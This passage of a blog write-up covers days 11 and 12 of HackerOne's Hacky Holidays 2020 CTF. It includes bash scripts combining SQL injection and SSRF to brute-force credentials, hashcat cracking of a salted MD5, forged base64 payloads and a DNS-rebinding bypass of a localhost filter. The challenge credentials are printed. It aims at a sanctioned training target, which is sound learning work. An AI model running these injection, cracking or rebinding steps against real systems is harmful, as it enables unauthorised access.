has our required data! We can confirm this by decoding the value.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-6.png" alt="IMAGE" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-7.png" alt="IMAGE" /></p></ol><h3 id="finding-valid-endpoints-and-their-parameters">Finding Valid endpoints and their parameters</h3><ol><li>We can generate the hashes, and we can make the server send request on our behalf, Cool!<li>Now if we query the <code class="language-plaintext highlighter-rouge">/api/*</code> endpoint, the response was not the previous error, which means now we can enumerate this api for valid endpoints.<li>Now any request that I sent to <code class="language-plaintext highlighter-rouge">/api/*</code> endpoint the response was always: <code class="language-plaintext highlighter-rouge">"Expected HTTP status 200, Received: 404"</code>. Which indicates the request is successful, but the resource/endpoint does not exists.<li>Did a little enumeration here, when I sent the request to <code class="language-plaintext highlighter-rouge">/api/user</code> the response changed to: <code class="language-plaintext highlighter-rouge">"Invalid content type detected"</code>. This indicates that this is a valid endpoint.<li>Next step was to find the valid parameters, which was quite straight forward as sending the request to <code class="language-plaintext highlighter-rouge">/api/user?username</code> &amp; <code class="language-plaintext highlighter-rouge">/api/user?password</code> had the response: <code class="language-plaintext highlighter-rouge">"Expected HTTP status 200, Received: 204"</code>, and for anyother parameters the response was <code class="language-plaintext highlighter-rouge">"Expected HTTP status 200, Received: 400"</code>.</ol><h3 id="get-valid-username-and-password">Get valid username and password</h3><ol><li><p>We have the valid parameters, now we need to find their values. The request for this purpose was as follows:</p><p>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27UNION%20SELECT%20”%27UNION%20SELECT%20NULL,NULL,%27../api/user?username=%%27%23”,null,null%23</p><p><strong>Note that extra “%” after “username=”, the % in sql replaces any number of characters - equivalent to ‘*’ in Linux/Unix</strong></p><li>First I tried to find the username, and I sent two names, <strong>admin &amp; grinch</strong>. Response for <strong>admin</strong> (or any other value) was <code class="language-plaintext highlighter-rouge">"Expected HTTP status 200, Received: 204"</code> but for <strong>grinch</strong> it was <code class="language-plaintext highlighter-rouge">"Invalid content type detected"</code> indicating its correct. To make sure if its the correct username, simply remove the <strong>”%”</strong> after username and if the response is still <code class="language-plaintext highlighter-rouge">"Invalid content type detected"</code> this means the username is correct otherwise there are more characters to this username.<li><p>The response was <code class="language-plaintext highlighter-rouge">"Expected HTTP status 200, Received: 204"</code> which means we have to find the remaining characters of this username. So to do that, I wrote a bash script which does checks for the valid characters and in the end prints out the complete username. Here is the script that I wrote:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre> <span class="nv">user</span><span class="o">=</span><span class="s2">"grinch"</span><span class="p">;</span>
 <span class="nv">check</span><span class="o">=</span>0<span class="p">;</span>
 <span class="nv">cont</span><span class="o">=</span>1<span class="p">;</span>
 <span class="k">while</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$cont</span><span class="si">)</span> <span class="o">==</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">do
     </span><span class="nv">check</span><span class="o">=</span>0<span class="p">;</span>
     <span class="k">for </span>char <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span><span class="si">)</span>
     <span class="k">do
         </span>curl <span class="nt">-s</span> <span class="s2">"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user?username=</span><span class="nv">$user$char</span><span class="s2">%25%27%23%22,null,null%23"</span> <span class="o">&gt;</span> response.txt<span class="p">;</span> 
         <span class="nb">hash</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>response.txt | <span class="nb">grep </span><span class="nv">data</span><span class="o">=</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"?"</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="o">=</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="se">\"</span> <span class="nt">-f1</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1<span class="si">)</span>
         curl <span class="nt">-s</span> <span class="nt">-i</span> <span class="s2">"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=</span><span class="nv">$hash</span><span class="s2">"</span> <span class="o">&gt;</span> final.txt
         <span class="nb">tail</span> <span class="nt">-n</span> 1 final.txt	 | <span class="nb">grep</span> <span class="s2">"Invalid content type detected"</span> <span class="o">&gt;</span> gotit.txt
         <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$char</span><span class="s2"> "</span><span class="p">;</span>
         <span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> gotit.txt <span class="o">]</span><span class="p">;</span> <span class="k">then
             </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Valid character found : </span><span class="nv">$char</span><span class="s2">"</span>
             user+<span class="o">=</span><span class="nv">$char</span>
             <span class="nv">check</span><span class="o">=</span>1<span class="p">;</span>
             <span class="nb">rm </span>gotit.txt
             <span class="nb">break
         </span><span class="k">fi
			
     done
		
     if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$check</span><span class="si">)</span> <span class="o">!=</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then 
         </span><span class="nv">cont</span><span class="o">=</span>0 
     <span class="k">fi

 done
 </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">USERNAME : </span><span class="nv">$user</span><span class="s2">"</span> 
</pre></table></code></div></div><p>This script takes just a wordlist of chars ( my wordlist was containing the following characters: <code class="language-plaintext highlighter-rouge">[a-z,A-Z,0-9,!@$]</code>) and check which are valid. The script showed that username is <strong><code class="language-plaintext highlighter-rouge">grinchadmin</code></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-8.png" alt="IMAGE" /></p><li><p>We found the username, now its time for password, which is quite straight forward now. I simply altered the above script and found the valid password too!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre> <span class="nv">pass</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
 <span class="nv">check</span><span class="o">=</span>0<span class="p">;</span>
 <span class="nv">cont</span><span class="o">=</span>1<span class="p">;</span>
 <span class="k">while</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$cont</span><span class="si">)</span> <span class="o">==</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">do
     </span><span class="nv">check</span><span class="o">=</span>0<span class="p">;</span>
     <span class="k">for </span>char <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span><span class="si">)</span>
     <span class="k">do
         </span>curl <span class="nt">-s</span> <span class="s2">"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user?username=grinchadmin%26password=</span><span class="nv">$pass$char</span><span class="s2">%25%27%23%22,null,null%23"</span> <span class="o">&gt;</span> response.txt<span class="p">;</span> 
         <span class="nb">hash</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>response.txt | <span class="nb">grep </span><span class="nv">data</span><span class="o">=</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"?"</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="o">=</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="se">\"</span> <span class="nt">-f1</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1<span class="si">)</span>
         curl <span class="nt">-s</span> <span class="nt">-i</span> <span class="s2">"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=</span><span class="nv">$hash</span><span class="s2">"</span> <span class="o">&gt;</span> final.txt
         <span class="nb">tail</span> <span class="nt">-n</span> 1 final.txt	 | <span class="nb">grep</span> <span class="s2">"Invalid content type detected"</span> <span class="o">&gt;</span> gotit.txt
         <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$char</span><span class="s2"> "</span>
         <span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> gotit.txt <span class="o">]</span><span class="p">;</span> <span class="k">then
             </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Valid character found : </span><span class="nv">$char</span><span class="s2">"</span>
             pass+<span class="o">=</span><span class="nv">$char</span>
             <span class="nv">check</span><span class="o">=</span>1<span class="p">;</span>
             <span class="nb">rm </span>gotit.txt
             <span class="nb">break
         </span><span class="k">fi
			
     done
		
     if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$check</span><span class="si">)</span> <span class="o">!=</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then 
         </span><span class="nv">cont</span><span class="o">=</span>0 
     <span class="k">fi

 done
 </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PASSWORD : </span><span class="nv">$pass</span><span class="s2">"</span>
</pre></table></code></div></div><p>The password it found was: <strong><code class="language-plaintext highlighter-rouge">s4nt4sucks</code></strong></p></ol><p>Now I went to <code class="language-plaintext highlighter-rouge">/attack-box/login</code> and used the found username and password to login. Success!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-9.png" alt="IMAGE" /></p><hr /><h1 id="day-12---the-day-when-we-saved-the-holidays">Day 12 - The day when we saved the holidays</h1><p>The day all the hackers were waiting for, to get a chance of stopping the grinch from ruining the holidays!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-1.png" alt="IMAGE" /></p><h2 id="information-gathering-11">Information Gathering</h2><ul><li><p>The application had very limited user interaction. There were 3 targets (Ip addresses). Clicking the <strong>Attack</strong> button launches the DOS attack against that IP address.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-2.png" alt="IMAGE" /></p><li><p>The url was interesting as we have an endpoint <code class="language-plaintext highlighter-rouge">/launch?payload=BASE64-ENCODED-VALUE</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-3.png" alt="IMAGE" /></p><li><p>Decoding the payload value, we get the data in following format:</p><p><code class="language-plaintext highlighter-rouge">{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-4.png" alt="IMAGE" /></p><li><p>So quite similar to the previous challenge right? If I chnange the IP address in <code class="language-plaintext highlighter-rouge">target</code> object, we get an error <code class="language-plaintext highlighter-rouge">"Invalid Protection Hash"</code>.</p></ul><p>So nothing else of interest here. Looking at the information we got, we can say that for each IP, there is a <code class="language-plaintext highlighter-rouge">hash</code> generated. So If we want to attack an IP of our choice (localhost, as we need to bring down grich’s network!), we need to generate the valid hash for that IP.</p><p>But how?</p><h2 id="hunting-the-flag-11">Hunting the flag</h2><ol><li><p>As I encountered something similar in previous challenge too, i tried to check the <code class="language-plaintext highlighter-rouge">launch?payload=</code> endpoint for SQLi, but could not succeed. I then tried to crack the hashes, but failed again. Quite confused as there were much there to tinker with.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-5.png" alt="IMAGE" /></p><li>Hackerone tweeted the above hint. Looking at it, it was quite straight forward as what I was missing. So a <strong>“hash with salt!”</strong><li>Having very limited knowledge about hashes, i simply searched about salted hashes (md5 in this case), how they work and how I can crack them. This is what I understood:<ul><li>A salt is a value that is added to user’s password (can be something else, just depends on context) to make it unique, and then apply some hashing algorithm.<li>To crack the salt hash, I need to know the password.</ul><li><p>I have the salt in hashed form, but where is the password. Was quite stuck here but a good friend pointed me to the right direction. But later I also found something which for me makes sense and we can use that information to at least guess what the password can be.</p><ul><li>If we look at the first image in our <strong>information gathering</strong> phase, the target is in form of <strong>“RANDOM_HASH.<code class="language-plaintext highlighter-rouge">target</code>“</strong>. Maybe the password for every hash is the <code class="language-plaintext highlighter-rouge">target</code> object value it self? (I don’t know if it was intended but this is what i thought, i think this makes a little sense, at least to me).</ul><li>So in a text file, I stored the values in this format: <strong><code class="language-plaintext highlighter-rouge">HASH:TARGET-IP</code></strong> as <code class="language-plaintext highlighter-rouge">HASH</code> is salt and <code class="language-plaintext highlighter-rouge">TARGET-IP</code> is our password.<li>Then using hashcat i was able to find the value.<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> hashcat <span class="nt">-a</span> 3 <span class="nt">-m</span> 20 crack.txt <span class="nt">--show</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">-a 3 for bruteforce attack, and -m 20 to select mode in (salt:pass) format</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-6.png" alt="IMAGE" /></p><p>So the salt value is <strong><code class="language-plaintext highlighter-rouge">mrgrinch463</code></strong>.</p><li>So we have <code class="language-plaintext highlighter-rouge">Salt</code> value, Now we know how the hash is being generated for the <code class="language-plaintext highlighter-rouge">target</code>. To generate hash for any target, we need to append the target value with the <code class="language-plaintext highlighter-rouge">SALT</code> value, as like <strong><code class="language-plaintext highlighter-rouge">mrgrinch463127.0.0.1</code></strong>.<li><p>Then convert that to md5 hash using any online site like https://www.md5hashgenerator.com/</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-7.png" alt="IMAGE" /></p><li><p>Then simply replace the <code class="language-plaintext highlighter-rouge">target</code> and <code class="language-plaintext highlighter-rouge">hash</code> objects with approriate values and encode it back to base64.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-8.png" alt="IMAGE" /></p><p>Use that encoded value as the value for <code class="language-plaintext highlighter-rouge">payload</code> parameter:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-9.png" alt="IMAGE" /></p><p>Whoops! The attack failed as there is some sort of protection. It is detecting the local address and aborting the attack against this. So we need to think about some bypass.</p><li>Well here I tried every possible bypass that I know, or can find on the internet but nothing really worked (or maybe I have not tried all the ways to bypass this protection yet).</ol><p>If we look at the above image, we can see that the IP address is being resolved two times.</p><ul><li>First <strong>before</strong> starting the botnets<li>Then <strong>after</strong> starting the botnets</ul><p>So what will happen if at first attempt, our IP is not of localhost (so attack will continue), but before reaching the second part, the IP gets changed to localhost.</p><p>This is actually a known attack vector called DNS Rebinding.</p><blockquote><p>DNS rebinding is a method of manipulating resolution of domain names that is commonly used as a form of computer attack. In this attack, a malicious web page causes visitors to run a client-side script that attacks machines elsewhere on the network.</p></blockquote><p>I used this amazing <a href="https://danielmiessler.com/blog/dns-rebinding-explained/">BLOG</a> to get a basic idea of how this attack works. Performing this attack manually would have been difficult for me, but thanks to a friend, he suggested this tool called <a href="https://github.com/taviso/rbndr">RBNDR</a></p><ol><li>Simply I went to https://lock.cmpxchg8b.com/rebinder.html, Enterd two IP addresses, one the localhost, and the second can be any random IP address. This will generate a domain, which basically works just as we described above (switch between 127.0.0.1 and second IP randomly).</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-10.png" alt="IMAGE" /></p><ol><li><p>Now we can follow the same steps, using the <strong><code class="language-plaintext highlighter-rouge">mrgrinch463</code></strong> as salt and IP address (in this case it is <strong><code class="language-plaintext highlighter-rouge">7f000001.c0a80001.rbndr.us</code></strong>), I converted this value into md5 hash.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-11.png" alt="IMAGE" /></p><li><p>Now converted the following into base64 encoded data:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"target":"7f000001.c0a80001.rbndr.us", "hash":"de9d82d4ae9a61660701e7e1844ea643"}
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-12.png" alt="IMAGE" /></p><li><p>Put that base64 encoded payload in the <code class="language-plaintext highlighter-rouge">/launch?payload=</code> endpoint as:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>    https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsICJoYXNoIjoiZGU5ZDgyZDRhZTlhNjE2NjA3MDFlN2UxODQ0ZWE2NDMifQ==
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-13.png" alt="IMAGE" /></p><p>Note that we did not get what we wanted at first, this is because the switching of IPs is quite random, So I had to visit the above url for 4-5 times to get it to work.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-14.png" alt="IMAGE" /></p></ol><p>Finally! The collective efforts of so many enthusiastic people saved the holidays. The Grinch Network is no more!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day12/day-12-15.png" alt="IMAGE" /></p><hr /><p>Thats all folks! I hope you guys enjoyed the writeup and learnt something new today. Kudos to <a href="https://twitter.com/adamtlangley">Adam Langley</a> for creating amazing challenges for us!</p><p>If you have any questions, feel free to drop a DM on <strong><a href="https://twitter.com/theFawsec">Twitter</a></strong></p><p><strong>Thanks!</strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-walkthroughs/'>CTF-Walkthroughs</a>, <a href='/categories/cybersecurity-competitions/'>CyberSecurity-Competitions</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/competition/" class="post-tag no-text-decoration" >competition</a> <a href="/tags/hackerone/" class="post-tag no-text-decoration" >hackerone</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hacky-Holidays. A Tale of Saving The Holidays - theFawsec&url=https://thefawsec.github.io/posts/Hacky-Holidays-2020/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hacky-Holidays. A Tale of Saving The Holidays - theFawsec&u=https://thefawsec.github.io/posts/Hacky-Holidays-2020/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hacky-Holidays. A Tale of Saving The Holidays - theFawsec&url=https://thefawsec.github.io/posts/Hacky-Holidays-2020/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://thefawsec.github.io/posts/Hacky-Holidays-2020/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CTF-Red-BsidesIslamabad-2020/">CTF-Red @ BsidesIslamabad-2020 - Pakistan's first ever Bsides</a><li><a href="/posts/Hacky-Holidays-2020/">Hacky-Holidays. A Tale of Saving The Holidays</a><li><a href="/posts/THM-Internal/">TryHackMe - Internal</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/competition/">competition</a> <a class="post-tag" href="/tags/bsidespakistan/">bsidespakistan</a> <a class="post-tag" href="/tags/hackerone/">hackerone</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CTF-Red-BsidesIslamabad-2020/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T15:00:00+05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTF-Red @ BsidesIslamabad-2020 - Pakistan's first ever Bsides</h3><div class="text-muted small"><p> Assalam-o-Alaikum folks! I hope you guys are safe and sound in this pandemic. BsidesIslamabad-2020 was the first ever Bsides cyber security conference of Pakistan, conducted on November 7th-8th 20...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Internal/"><div class="card-body"> <span class="timeago small" > Apr 12 <i class="unloaded">2021-04-12T18:00:00+05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Internal</h3><div class="text-muted small"><p> Intenal is a hard difficulty penetration testing challenge created by TheMayor. Enumeration Lets start our nmap scan and see what ports are open and what services are running on these ports. nmap ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CTF-Red-BsidesIslamabad-2020/" class="btn btn-outline-primary" prompt="Older"><p>CTF-Red @ BsidesIslamabad-2020 - Pakistan's first ever Bsides</p></a> <a href="/posts/THM-Internal/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe - Internal</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/thefawsec">Fawaz Masood Qureshi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/competition/">competition</a> <a class="post-tag" href="/tags/bsidespakistan/">bsidespakistan</a> <a class="post-tag" href="/tags/hackerone/">hackerone</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://thefawsec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
